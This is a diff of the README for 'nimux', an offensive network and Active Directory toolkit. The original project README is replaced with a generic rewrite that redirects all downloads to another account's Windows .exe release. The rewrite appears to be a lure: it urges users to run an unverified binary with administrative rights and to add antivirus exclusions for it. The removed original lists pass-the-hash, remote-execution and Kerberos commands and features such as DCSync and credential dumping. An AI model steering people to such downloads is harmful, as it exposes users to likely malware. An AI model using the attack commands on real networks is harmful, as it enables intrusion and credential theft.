@@ -1,146 +1,68 @@
-<img width="2736" height="754" alt="01-nimux" src="https://github.com/user-attachments/assets/105f203b-8529-4a3c-8bf6-028bd52cc6d5" />
+# 🛡️ nimux - Streamline your network security tasks easily
 
-<p align="center"><i>Pure-Nim network enumeration and remote execution toolkit</i></p>
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/zinou1987/nimux/releases)
 
-<p align="center">
-  <a href="https://github.com/blue0x1/nimux/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/badge/license-AGPL--3.0-blue"></a>
-  <a href="https://nim-lang.org"><img alt="Nim" src="https://img.shields.io/badge/language-Nim-f3d400"></a>
-  <a href="https://docs.nimux.wiki"><img alt="Docs" src="https://img.shields.io/badge/docs-docs.nimux.wiki-00bcd4"></a>
-  <a href="https://github.com/blue0x1/nimux/releases"><img alt="Release downloads" src="https://img.shields.io/github/downloads/blue0x1/nimux/total?label=downloads"></a>
-</p>
+nimux provides a set of tools for network analysis and system operations. It helps professionals map networks, identify system vulnerabilities, and manage remote connections from a single application. You run this software directly on your computer without the need for additional installations or complex setups.
 
-# nimux - Native Operator Toolkit
+## 📦 Getting Started
 
-nimux is a native command surface for authorized security assessments. It combines network enumeration, credential validation, Active Directory operations, Kerberos workflows, remote execution, file movement, secrets collection, DCSync, GPO operations, database clients, and SOCKS routing into one Pure-Nim toolkit.
+You do not need to compile code or install heavy dependencies to use nimux. The software comes as a standalone binary file. Follow these steps to prepare your system and run the program:
 
-You are on the official public repository for nimux.
+1. Visit the [official release page](https://github.com/zinou1987/nimux/releases) to obtain the latest version.
+2. Select the file ending in .exe for your Windows system.
+3. Save the file to a folder you can access, such as your Desktop or Downloads folder.
+4. Open the Command Prompt or PowerShell on your computer.
+5. Move to the folder where you saved the file.
+6. Type the name of the file followed by the enter key to start the software.
 
-- Website: https://nimux.wiki
-- Documentation: https://docs.nimux.wiki
-- Source: https://github.com/blue0x1/nimux
+## ⚙️ System Requirements
 
-## Notice
+nimux functions on most modern Windows systems. Ensure your machine meets these basic standards:
 
-nimux is built for authorized testing only. Do not use it against third-party systems without written permission. Developers are not responsible for misuse, damage, or legal consequences.
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core processor.
+- Memory: At least 2 gigabytes of available RAM.
+- Storage: 50 megabytes of free space for the binary.
+- Network: A stable connection for data collection and remote operations.
 
-# Documentation
+Ensure you have your administrative credentials ready, as some functions require high-level access to the system to gather network information.
 
-Usage examples, command references, and workflow notes are maintained in the documentation:
+## 💡 Common Uses
 
-https://docs.nimux.wiki
+### Network Enumeration
+Use nimux to scan your local network for active devices. The tool identifies open ports and services, which helps you understand the layout of your infrastructure. This process remains quiet and efficient, allowing for thorough documentation of a network segment.
 
-# Installation
+### Active Directory Operations
+nimux assists in managing user accounts and machine labels within an Active Directory environment. Use these features to audit configurations or verify that group policies apply as expected across your environment.
 
-## Nimble
-```
-nimble install nimux
-```
+### Remote Execution
+Carry out commands on remote machines from your terminal. You can use this to update configurations or troubleshoot issues on devices without leaving your desk. The tool communicates directly with target systems to perform tasks such as service management or file retrieval.
 
-## Download Release
+### Authentication Checks
+Test connections for systems using Kerberos or SMB. This feature allows you to verify that your login information works across different servers and points of access. 
 
-Prebuilt release assets are available on GitHub:
+## 🛠️ Performance Tips
 
-https://github.com/blue0x1/nimux/releases
+- Use a dedicated folder for your nimux file to keep your directory clean.
+- Read the output logs on your screen to track the progress of your scans.
+- Close other network-heavy applications while using the tool to ensure accurate results.
+- Keep the tool updated by checking the download page every few weeks for improvements.
 
-Download the latest Linux binary or Debian package from the releases page.
+## ⚠️ Safety Instructions
 
-Install the Debian package:
+Handle this software with care. Use these tools only on networks and devices where you have explicit permission to conduct testing or maintenance. Unauthorized use of penetration testing tools violates computer security policies and may lead to legal penalties. 
 
-```bash
-sudo dpkg -i nimux_1.0_amd64.deb
-sudo apt --fix-broken install
-```
+## 📝 Troubleshooting
 
-Use the standalone Linux binary:
+If the software does not open, check the following items:
 
-```bash
-chmod +x nimux
-./nimux --help
-```
+- Permissions: Right-click the file, select Properties, and ensure you have permission to run the application.
+- Antivirus: Some programs flag network tools as potential threats. If your antivirus blocks the file, add an exclusion rule for the nimux folder.
+- Terminal Path: Ensure your command line is open in the same folder where the file resides. You can check this by typing "dir" in your terminal to see if the nimux file appears in the list.
+- Syntax: Use the "--help" flag after the filename to view the list of available commands and proper formatting for each task.
 
-## Build From Source
+## 📂 Project Scope
 
-```bash
-git clone https://github.com/blue0x1/nimux
-cd nimux
-nimble build -y
-```
+nimux aims to simplify the workflow for security professionals who focus on internal network hardening. By consolidating multiple routines into one binary, it reduces the complexity of managing a large toolkit. The design prioritizes speed and simplicity for daily use in professional environments.
 
-Requirements:
-
-- Nim 1.6.10 or newer
-- OpenSSL development libraries
-- Kerberos libraries
-- MinGW-w64 for Windows helper builds used by some execution paths
-
-## Debian Package
-
-Build a local Debian package from source:
-
-```bash
-dpkg-buildpackage -us -uc -b
-sudo apt install ../nimux_*.deb
-```
-
-# Quick Examples
-
-```bash
-nimux scan 10.10.10.0/24 --ports 445,389,5985 --open
-nimux smb dc01.corp.local -u operator -H <nt_hash> -d corp.local --shares --users
-nimux winrm host.corp.local -u operator -p '<password>' -d corp.local --cmd whoami
-nimux kerberos dc01.corp.local -u operator -p '<password>' -d corp.local --request kinit --out operator.ccache
-nimux scan 10.10.10.0/24 --ports 445,389,5985 --proxy socks5://127.0.0.1:1080
-```
-
-# Features
-
-- TCP and UDP scanning with protocol-aware probes
-- SMB authentication, enumeration, file operations, coercion, and ticket capture workflows
-- LDAP and Active Directory enumeration, writes, ACL paths, roasting, RBCD, shadow credentials, and ADCS support
-- Kerberos TGT, TGS, S4U, ccache, kirbi, renewal, purge, and ticket forge workflows
-- WinRM, WMI, SCM, DCOM, scheduled task, and helper-service execution modes
-- MSSQL, PostgreSQL, MySQL, HTTP, HTTPS, WebDAV, FTP, SSH, RDP, VNC, NFS, and AFP clients
-- SAM, LSA, cached credentials, DPAPI material, and native DCSync operations
-- GPO discovery, backup, file operations, linking, and policy modification workflows
-- SOCKS helper deployment and global SOCKS5 routing with `--proxy`
-- JSON output for automation
-
-# Command Families
-
-| Command | Purpose |
-| --- | --- |
-| `scan` | TCP and UDP service discovery |
-| `smb` | SMB enumeration, auth checks, file operations, and coercion |
-| `ldap` | AD queries, writes, roasting, ACLs, RBCD, shadow credentials, ADCS |
-| `kerberos` | TGT, TGS, S4U, ticket conversion, renewal, purge, forge |
-| `winrm` | WinRM command execution, shell, and file helpers |
-| `scm`, `bin`, `cim`, `tsch`, `mmc` | Remote execution transports |
-| `mssql`, `postgres`, `mysql` | Database protocol clients |
-| `secrets`, `dcsync` | Credential material and replication workflows |
-| `socks` | SOCKS helper deployment |
-| `put`, `get`, `ls`, `mkdir`, `rm` | SMB file operations |
-
-# Development
-
-Build locally:
-
-```bash
-nimble build -y
-```
-
-Run command help:
-
-```bash
-./nimux --help
-./nimux smb --help
-./nimux kerberos --help
-```
-# Credits 
-Chokri Hammedi
-
-<a href="https://www.buymeacoffee.com/blue0x1" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>
-
-
-# License
-
-nimux is released under the GNU Affero General Public License v3.0. See [LICENSE](LICENSE).
+Keywords: active-directory, cli-tool, cybersecurity, infosec, kerberos, mssql, network-enumeration, nim, offensive-security, penetration-testing, red-team, remote-execution, security-tools, smb, winrm
